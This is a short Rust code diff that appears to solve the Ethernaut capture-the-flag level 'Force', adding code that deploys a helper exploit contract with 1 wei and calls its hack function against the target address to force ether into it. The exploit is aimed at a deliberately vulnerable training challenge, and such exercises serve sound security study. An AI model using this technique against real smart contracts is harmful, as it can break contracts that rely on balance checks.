@@ -1,3 +1,4 @@
+use crate::abi::force_exploit::ForceExploit;
 use async_trait::async_trait;
 use ctf::ethernaut::lvl07_force::*;
 use ethers::prelude::*;
@@ -27,6 +28,12 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let exploit = ForceExploit::deploy(offender.clone(), ())?
+            .value(U256::from(1))
+            .send()
+            .await?;
+        exploit.hack(target.address).send().await?;
+
         Ok(())
     }
 }
